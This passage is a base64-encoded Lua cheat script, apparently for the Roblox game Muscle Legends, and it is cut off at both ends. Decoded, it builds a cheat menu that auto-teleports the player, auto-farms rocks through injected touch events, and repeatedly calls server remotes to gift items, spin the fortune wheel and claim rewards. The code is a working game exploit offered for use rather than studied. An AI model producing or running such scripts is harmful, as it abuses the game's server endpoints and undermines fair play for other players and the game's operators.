lU2l6ZSkgZW5kCiAgICBlbmQKfSkKClJlYmlydGhUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIkF1dG8gVFAgTXVzY2xlIEtpbmcgR3ltIiwKICAgIERlc2MgPSAiVGVsZXBvcnQgdG8gTXVzY2xlIEtpbmcgR3ltIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIHRlbGVwb3J0RW5hYmxlZCA9IHN0YXRlCiAgICAgICAgaWYgc3RhdGUgdGhlbiB0YXNrLnNwYXduKHRlbGVwb3J0VG9NdXNjbGVLaW5nKSBlbmQKICAgIGVuZAp9KQoKLS0gUm9jayBUYWIKbG9jYWwgUm9ja1RhYiA9IFdpbmRvdzpUYWIoe1RpdGxlID0gIlJvY2siLCBJY29uID0gIm1vdW50YWluIn0pCgotLSBGYXN0IEdsaXRjaCBTZWN0aW9uClJvY2tUYWI6U2VjdGlvbih7VGl0bGUgPSAiRkFTVCBHTElUQ0gifSkKCmxvY2FsIHNlbGVjdHJvY2sgPSAiIgoKLS0gUm9jayBGYXJtIEZ1bmN0aW9ucwpsb2NhbCBmdW5jdGlvbiBjcmVhdGVSb2NrVG9nZ2xlKHRpdGxlLCBkZXNjLCByb2NrTmFtZSwgZHVyYWJpbGl0eSkKICAgIFJvY2tUYWI6VG9nZ2xlKHsKICAgICAgICBUaXRsZSA9IHRpdGxlLAogICAgICAgIERlc2MgPSBkZXNjLAogICAgICAgIFZhbHVlID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgc2VsZWN0cm9jayA9IHJvY2tOYW1lCiAgICAgICAgICAgIGdldGdlbnYoKS5hdXRvRmFybSA9IHN0YXRlCiAgICAgICAgICAgIHdoaWxlIGdldGdlbnYoKS5hdXRvRmFybSBkbwogICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkR1cmFiaWxpdHkuVmFsdWUgPj0gZHVyYWJpbGl0eSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIGksIHYgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKS5tYWNoaW5lc0ZvbGRlcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiB2Lk5hbWUgPT0gIm5lZWRlZER1cmFiaWxpdHkiIGFuZCB2LlZhbHVlID09IGR1cmFiaWxpdHkgYW5kIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkxlZnRIYW5kIikgYW5kIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlJpZ2h0SGFuZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5SaWdodEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuUmlnaHRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkxlZnRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkxlZnRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGksIHYgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdi5OYW1lID09ICJQdW5jaCIgYW5kIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOkVxdWlwVG9vbCh2KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJwdW5jaCIsICJsZWZ0SGFuZCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJwdW5jaCIsICJyaWdodEhhbmQiKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0pCmVuZAoKLS0gUm9jayBGYXJtIFRvZ2dsZXMKY3JlYXRlUm9ja1RvZ2dsZSgiQXV0byBUaW55SXNsYW5kUm9jayBbMF0iLCAiMCBEdXJhYmlsaXR5IFJlcXVpcmVkIiwgIlRpbnkgSXNsYW5kIFJvY2siLCAwKQpjcmVhdGVSb2NrVG9nZ2xlKCJBdXRvIFN0YXJ0ZXJJc2xhbmRSb2NrIFsxMDBdIiwgIjEwMCBEdXJhYmlsaXR5IFJlcXVpcmVkIiwgIlN0YXJ0ZXIgSXNsYW5kIFJvY2siLCAxMDApCmNyZWF0ZVJvY2tUb2dnbGUoIkF1dG8gTGVnZW5kQmVhY2hSb2NrIFs1a10iLCAiNSwwMDAgRHVyYWJpbGl0eSBSZXF1aXJlZCIsICJMZWdlbmQgQmVhY2ggUm9jayIsIDUwMDApCmNyZWF0ZVJvY2tUb2dnbGUoIkF1dG8gRnJvc3RHeW1Sb2NrIFsxNTBrXSIsICIxNTAsMDAwIER1cmFiaWxpdHkgUmVxdWlyZWQiLCAiRnJvc3QgR3ltIFJvY2siLCAxNTAwMDApCmNyZWF0ZVJvY2tUb2dnbGUoIkF1dG8gTXl0aGljYWxHeW1Sb2NrIFs0MDBrXSIsICI0MDAsMDAwIER1cmFiaWxpdHkgUmVxdWlyZWQiLCAiTXl0aGljYWwgR3ltIFJvY2siLCA0MDAwMDApCmNyZWF0ZVJvY2tUb2dnbGUoIkF1dG8gRXRlcm5hbEd5bVJvY2sgWzc1MGtdIiwgIjc1MCwwMDAgRHVyYWJpbGl0eSBSZXF1aXJlZCIsICJFdGVybmFsIEd5bSBSb2NrIiwgNzUwMDAwKQpjcmVhdGVSb2NrVG9nZ2xlKCJBdXRvIExlZ2VuZEd5bVJvY2sgWzFtXSIsICIxLDAwMCwwMDAgRHVyYWJpbGl0eSBSZXF1aXJlZCIsICJMZWdlbmQgR3ltIFJvY2siLCAxMDAwMDAwKQpjcmVhdGVSb2NrVG9nZ2xlKCJBdXRvIE11c2NsZUtpbmdHeW1Sb2NrIFs1bV0iLCAiNSwwMDAsMDAwIER1cmFiaWxpdHkgUmVxdWlyZWQiLCAiTXVzY2xlIEtpbmcgR3ltIFJvY2siLCA1MDAwMDAwKQpjcmVhdGVSb2NrVG9nZ2xlKCJBdXRvIEFuY2llbnRKdW5nbGVSb2NrIFsxMG1dIiwgIjEwLDAwMCwwMDAgRHVyYWJpbGl0eSBSZXF1aXJlZCIsICJBbmNpZW50IEp1bmdsZSBSb2NrIiwgMTAwMDAwMDApCgotLSBFZ2dzIFRhYgpsb2NhbCBFZ2dzVGFiID0gV2luZG93OlRhYih7VGl0bGUgPSAiRWdncyIsIEljb24gPSAiZ2lmdCJ9KQoKLS0gUHJvdGVpbiBFZ2cgR2lmdGluZyBTZWN0aW9uCkVnZ3NUYWI6U2VjdGlvbih7VGl0bGUgPSAiR2lmdGluZyBQcm90ZWluIEVnZyJ9KQoKbG9jYWwgcHJvdGVpbkVnZ0xhYmVsID0gRWdnc1RhYjpMYWJlbCh7VGl0bGUgPSAiUHJvdGVpbiBFZ2dzIiwgRGVzYyA9ICIwIn0pCmxvY2FsIHNlbGVjdGVkRWdnUGxheWVyID0gbmlsCmxvY2FsIGVnZ0NvdW50ID0gMAoKbG9jYWwgZWdnRHJvcGRvd24gPSBFZ2dzVGFiOkRyb3Bkb3duKHsKICAgIFRpdGxlID0gIlBsYXllciB0byBHaWZ0IEVnZ3MiLAogICAgTGlzdCA9IHt9LAogICAgVmFsdWUgPSAiIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc2VsZWN0ZWREaXNwbGF5TmFtZSkKICAgICAgICBmb3IgXywgcGxyIGluIGlwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKTpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgIGlmIHBsci5EaXNwbGF5TmFtZSA9PSBzZWxlY3RlZERpc3BsYXlOYW1lIHRoZW4KICAgICAgICAgICAgICAgIHNlbGVjdGVkRWdnUGxheWVyID0gcGxyCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gUG9wdWxhdGUgZHJvcGRvd24gd2l0aCBwbGF5ZXJzCmZvciBfLCBwbHIgaW4gaXBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpOkdldFBsYXllcnMoKSkgZG8KICAgIGlmIHBsciB+PSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllciB0aGVuCiAgICAgICAgZWdnRHJvcGRvd246QWRkKHBsci5EaXNwbGF5TmFtZSkKICAgIGVuZAplbmQKCmdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLlBsYXllckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24ocGxyKQogICAgaWYgcGxyIH49IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyIHRoZW4KICAgICAgICBlZ2dEcm9wZG93bjpBZGQocGxyLkRpc3BsYXlOYW1lKQogICAgZW5kCmVuZCkKCkVnZ3NUYWI6VGV4dGJveCh7CiAgICBUaXRsZSA9ICJBbW91bnQgb2YgRWdncyIsCiAgICBEZXNjID0gIkVudGVyIG51bWJlciBvZiBlZ2dzIHRvIGdpZnQiLAogICAgUGxhY2Vob2xkZXIgPSAiMCIsCiAgICBWYWx1ZSA9ICIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0ZXh0KQogICAgICAgIGVnZ0NvdW50ID0gdG9udW1iZXIodGV4dCkgb3IgMAogICAgZW5kCn0pCgpFZ2dzVGFiOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJHaWZ0IEVnZ3MiLAogICAgRGVzYyA9ICJTZW5kIHByb3RlaW4gZWdncyB0byBzZWxlY3RlZCBwbGF5ZXIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgaWYgc2VsZWN0ZWRFZ2dQbGF5ZXIgYW5kIGVnZ0NvdW50ID4gMCB0aGVuCiAgICAgICAgICAgIGZvciBpID0gMSwgZWdnQ291bnQgZG8KICAgICAgICAgICAgICAgIGxvY2FsIGVnZyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLmNvbnN1bWFibGVzRm9sZGVyOkZpbmRGaXJzdENoaWxkKCJQcm90ZWluIEVnZyIpCiAgICAgICAgICAgICAgICBpZiBlZ2cgdGhlbgogICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLmdpZnRSZW1vdGU6SW52b2tlU2VydmVyKCJnaWZ0UmVxdWVzdCIsIHNlbGVjdGVkRWdnUGxheWVyLCBlZ2cpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gVHJvcGljYWwgU2hha2UgR2lmdGluZyBTZWN0aW9uCkVnZ3NUYWI6U2VjdGlvbih7VGl0bGUgPSAiR2lmdGluZyBUcm9waWNhbCBTaGFrZXMifSkKCmxvY2FsIHRyb3BpY2FsU2hha2VMYWJlbCA9IEVnZ3NUYWI6TGFiZWwoe1RpdGxlID0gIlRyb3BpY2FsIFNoYWtlcyIsIERlc2MgPSAiMCJ9KQpsb2NhbCBzZWxlY3RlZFNoYWtlUGxheWVyID0gbmlsCmxvY2FsIHNoYWtlQ291bnQgPSAwCgpsb2NhbCBzaGFrZURyb3Bkb3duID0gRWdnc1RhYjpEcm9wZG93bih7CiAgICBUaXRsZSA9ICJQbGF5ZXIgdG8gR2lmdCBUcm9waWNhbCBTaGFrZXMiLAogICAgTGlzdCA9IHt9LAogICAgVmFsdWUgPSAiIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc2VsZWN0ZWREaXNwbGF5TmFtZSkKICAgICAgICBmb3IgXywgcGxyIGluIGlwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKTpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgIGlmIHBsci5EaXNwbGF5TmFtZSA9PSBzZWxlY3RlZERpc3BsYXlOYW1lIHRoZW4KICAgICAgICAgICAgICAgIHNlbGVjdGVkU2hha2VQbGF5ZXIgPSBwbHIKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCn0pCgpmb3IgXywgcGxyIGluIGlwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKTpHZXRQbGF5ZXJzKCkpIGRvCiAgICBpZiBwbHIgfj0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIHNoYWtlRHJvcGRvd246QWRkKHBsci5EaXNwbGF5TmFtZSkKICAgIGVuZAplbmQKCmdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLlBsYXllckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24ocGxyKQogICAgaWYgcGxyIH49IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyIHRoZW4KICAgICAgICBzaGFrZURyb3Bkb3duOkFkZChwbHIuRGlzcGxheU5hbWUpCiAgICBlbmQKZW5kKQoKRWdnc1RhYjpUZXh0Ym94KHsKICAgIFRpdGxlID0gIlRyb3BpY2FsIFNoYWtlcyBnaWZ0IiwKICAgIERlc2MgPSAiRW50ZXIgbnVtYmVyIG9mIHNoYWtlcyB0byBnaWZ0IiwKICAgIFBsYWNlaG9sZGVyID0gIjAiLAogICAgVmFsdWUgPSAiIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odGV4dCkKICAgICAgICBzaGFrZUNvdW50ID0gdG9udW1iZXIodGV4dCkgb3IgMAogICAgZW5kCn0pCgpFZ2dzVGFiOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJHaWZ0IFRyb3BpY2FsIFNoYWtlcyIsCiAgICBEZXNjID0gIlNlbmQgdHJvcGljYWwgc2hha2VzIHRvIHNlbGVjdGVkIHBsYXllciIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBpZiBzZWxlY3RlZFNoYWtlUGxheWVyIGFuZCBzaGFrZUNvdW50ID4gMCB0aGVuCiAgICAgICAgICAgIGZvciBpID0gMSwgc2hha2VDb3VudCBkbwogICAgICAgICAgICAgICAgbG9jYWwgc2hha2UgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5jb25zdW1hYmxlc0ZvbGRlcjpGaW5kRmlyc3RDaGlsZCgiVHJvcGljYWwgU2hha2UiKQogICAgICAgICAgICAgICAgaWYgc2hha2UgdGhlbgogICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLmdpZnRSZW1vdGU6SW52b2tlU2VydmVyKCJnaWZ0UmVxdWVzdCIsIHNlbGVjdGVkU2hha2VQbGF5ZXIsIHNoYWtlKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEl0ZW0gQ291bnQgVXBkYXRlcgpsb2NhbCBmdW5jdGlvbiB1cGRhdGVJdGVtQ291bnQoKQogICAgbG9jYWwgcHJvdGVpbkVnZ0NvdW50ID0gMAogICAgbG9jYWwgdHJvcGljYWxTaGFrZUNvdW50ID0gMAoKICAgIGxvY2FsIGJhY2twYWNrID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXI6V2FpdEZvckNoaWxkKCJCYWNrcGFjayIpCiAgICBpZiBiYWNrcGFjayB0aGVuCiAgICAgICAgZm9yIF8sIGl0ZW0gaW4gaXBhaXJzKGJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIGl0ZW0uTmFtZSA9PSAiUHJvdGVpbiBFZ2ciIHRoZW4KICAgICAgICAgICAgICAgIHByb3RlaW5FZ2dDb3VudCA9IHByb3RlaW5FZ2dDb3VudCArIDEKICAgICAgICAgICAgZWxzZWlmIGl0ZW0uTmFtZSA9PSAiVHJvcGljYWwgU2hha2UiIG9yIGl0ZW0uTmFtZSA9PSAiUGnDg8aSw4bigJnDg+KAoMOi4oKs4oSiw4PGksOi4oKsxaHDg+KAmsOCwrFhcyIgdGhlbgogICAgICAgICAgICAgICAgdHJvcGljYWxTaGFrZUNvdW50ID0gdHJvcGljYWxTaGFrZUNvdW50ICsgMQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAoKICAgIHByb3RlaW5FZ2dMYWJlbDpTZXREZXNjKHRvc3RyaW5nKHByb3RlaW5FZ2dDb3VudCkpCiAgICB0cm9waWNhbFNoYWtlTGFiZWw6U2V0RGVzYyh0b3N0cmluZyh0cm9waWNhbFNoYWtlQ291bnQpKQplbmQKCnRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgIHVwZGF0ZUl0ZW1Db3VudCgpCiAgICAgICAgdGFzay53YWl0KDAuMjUpCiAgICBlbmQKZW5kKQoKLS0gQXV0byBGZWF0dXJlcyBTZWN0aW9uCkVnZ3NUYWI6U2VjdGlvbih7VGl0bGUgPSAiQXV0byBGZWF0dXJlcyJ9KQoKLS0gQXV0byBFYXQgRWdnICgzMG1pbikKbG9jYWwgYXV0b0VnZ0VuYWJsZWQzMCA9IGZhbHNlCmxvY2FsIGZ1bmN0aW9uIGF1dG9FYXRFZ2czMCgpCiAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcgogICAgd2hpbGUgYXV0b0VnZ0VuYWJsZWQzMCBkbwogICAgICAgIGxvY2FsIHRvb2wgPSBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlByb3RlaW4gRWdnIikKICAgICAgICBpZiB0b29sIHRoZW4KICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgIHRvb2w6QWN0aXZhdGUoKQogICAgICAgICAgICB0YXNrLndhaXQoMTgwMCkgLS0gMzAgbWludXRlcwogICAgICAgIGVsc2UKICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpFZ2dzVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIFByb3RlaW4gRWdnICgzMG1pbikiLAogICAgRGVzYyA9ICJBdXRvbWF0aWNhbGx5IGVhdCBwcm90ZWluIGVnZ3MgZXZlcnkgMzAgbWludXRlcyIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBhdXRvRWdnRW5hYmxlZDMwID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuIHRhc2suc3Bhd24oYXV0b0VhdEVnZzMwKSBlbmQKICAgIGVuZAp9KQoKLS0gQXV0byBFYXQgRWdnICgxaG91cikKbG9jYWwgYXV0b0VnZ0VuYWJsZWQ2MCA9IGZhbHNlCmxvY2FsIGZ1bmN0aW9uIGF1dG9FYXRFZ2c2MCgpCiAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcgogICAgd2hpbGUgYXV0b0VnZ0VuYWJsZWQ2MCBkbwogICAgICAgIGxvY2FsIHRvb2wgPSBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlByb3RlaW4gRWdnIikKICAgICAgICBpZiB0b29sIHRoZW4KICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgIHRvb2w6QWN0aXZhdGUoKQogICAgICAgICAgICB0YXNrLndhaXQoMzYwMCkgLS0gMSBob3VyCiAgICAgICAgZWxzZQogICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICBlbmQKICAgIGVuZAplbmQKCkVnZ3NUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIkF1dG8gUHJvdGVpbiBFZ2cgKDFob3VyKSIsCiAgICBEZXNjID0gIkF1dG9tYXRpY2FsbHkgZWF0IHByb3RlaW4gZWdncyBldmVyeSBob3VyIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGF1dG9FZ2dFbmFibGVkNjAgPSBzdGF0ZQogICAgICAgIGlmIHN0YXRlIHRoZW4gdGFzay5zcGF3bihhdXRvRWF0RWdnNjApIGVuZAogICAgZW5kCn0pCgotLSBBdXRvIEVhdCBBbGwgU25hY2tzCmxvY2FsIGVhdFNuYWNrRW5hYmxlZCA9IGZhbHNlCmxvY2FsIHNuYWNrcyA9IHsiUHJvdGVpbiBFZ2ciLCAiVHJvcGljYWwgU2hha2UifSAtLSBBZGQgb3RoZXIgc25hY2sgbmFtZXMgYXMgbmVlZGVkCgpsb2NhbCBmdW5jdGlvbiBlYXRBbGxTbmFjaygpCiAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcgogICAgd2hpbGUgZWF0U25hY2tFbmFibGVkIGRvCiAgICAgICAgZm9yIF8sIHNuYWNrTmFtZSBpbiBpcGFpcnMoc25hY2tzKSBkbwogICAgICAgICAgICBsb2NhbCB0b29sID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKHNuYWNrTmFtZSkKICAgICAgICAgICAgaWYgdG9vbCB0aGVuCiAgICAgICAgICAgICAgICB0b29sLlBhcmVudCA9IHBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICB0b29sOkFjdGl2YXRlKCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgdGFzay53YWl0KG1hdGgucmFuZG9tKDEsIDIpKQogICAgZW5kCmVuZAoKRWdnc1RhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBFYXQgQWxsIFNuYWNrcyIsCiAgICBEZXNjID0gIkF1dG9tYXRpY2FsbHkgY29uc3VtZSBhbGwgYXZhaWxhYmxlIHNuYWNrcyIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBlYXRTbmFja0VuYWJsZWQgPSBzdGF0ZQogICAgICAgIGlmIHN0YXRlIHRoZW4gdGFzay5zcGF3bihlYXRBbGxTbmFjaykgZW5kCiAgICBlbmQKfSkKCi0tIEF1dG8gU3BpbiBXaGVlbApsb2NhbCBhdXRvU3BpbldoZWVsRW5hYmxlZCA9IGZhbHNlCgpsb2NhbCBmdW5jdGlvbiBhdXRvU3BpbldoZWVsKCkKICAgIHdoaWxlIGF1dG9TcGluV2hlZWxFbmFibGVkIGRvCiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMub3BlbkZvcnR1bmVXaGVlbFJlbW90ZTpJbnZva2VTZXJ2ZXIoIm9wZW5Gb3J0dW5lV2hlZWwiLCBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuZm9ydHVuZVdoZWVsQ2hhbmNlc1siRm9ydHVuZSBXaGVlbCJdKQogICAgICAgIHRhc2sud2FpdCgxKQogICAgZW5kCmVuZAoKRWdnc1RhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBTcGluIEZvcnR1bmUgV2hlZWwiLAogICAgRGVzYyA9ICJBdXRvbWF0aWNhbGx5IHNwaW4gdGhlIGZvcnR1bmUgd2hlZWwiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgYXV0b1NwaW5XaGVlbEVuYWJsZWQgPSBzdGF0ZQogICAgICAgIGlmIHN0YXRlIHRoZW4gdGFzay5zcGF3bihhdXRvU3BpbldoZWVsKSBlbmQKICAgIGVuZAp9KQoKLS0gQXV0byBDbGFpbSBHaWZ0CmxvY2FsIGF1dG9DbGFpbUdpZnQgPSBmYWxzZQoKRWdnc1RhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBDbGFpbSBHaWZ0IiwKICAgIERlc2MgPSAiQXV0b21hdGljYWxseSBjbGFpbSBmcmVlIGdpZnRzIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGF1dG9DbGFpbUdpZnQgPSBzdGF0ZQogICAgICAgIHdoaWxlIGF1dG9DbGFpbUdpZnQgZG8KICAgICAgICAgICAgZm9yIGkgPSAxLCA4IGRvCiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5mcmVlR2lmdENsYWltUmVtb3RlOkludm9rZVNlcnZlcigiY2xhaW1HaWZ0IiwgaSkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBHeW0gVGFiCmxvY2FsIEd5bVRhYiA9IFdpbmRvdzpUYWIoe1RpdGxlID0gIkd5bSIsIEljb24gPSAiZHVtYmJlbGwifSkKCkd5bVRhYjpTZWN0aW9uKHtUaXRsZSA9ICJHWU0gTUFDSElORVMifSkKCmxvY2FsIGN1cnJlbnRNYWNoaW5lID0gbmlsCmxvY2FsIGN1cnJlbnRNYWNoaW5lQWN0aXZlID0gZmFsc2UKCi0tIEZ1bmN0aW9uIHRvIHVzZSBtYWNoaW5lICh0ZWxlcG9ydCBvbmNlKQpsb2NhbCBmdW5jdGlvbiBzZXR1cE1hY2hpbmUobWFjaGluZU5hbWUpCiAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgbWFjaGluZSA9IHdvcmtzcGFjZS5tYWNoaW5lc0ZvbGRlcjpGaW5kRmlyc3RDaGlsZChtYWNoaW5lTmFtZSkKICAgICAgICBpZiBtYWNoaW5lIGFuZCBtYWNoaW5lOkZpbmRGaXJzdENoaWxkKCJpbnRlcmFjdFNlYXQiKSB0aGVuCiAgICAgICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgaWYgY2hhcmFjdGVyIGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICBjaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBtYWNoaW5lLmludGVyYWN0U2VhdC5DRnJhbWUKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgICAgICAgICBjdXJyZW50TWFjaGluZSA9IG1hY2hpbmVOYW1lCiAgICAgICAgICAgICAgICBjdXJyZW50TWFj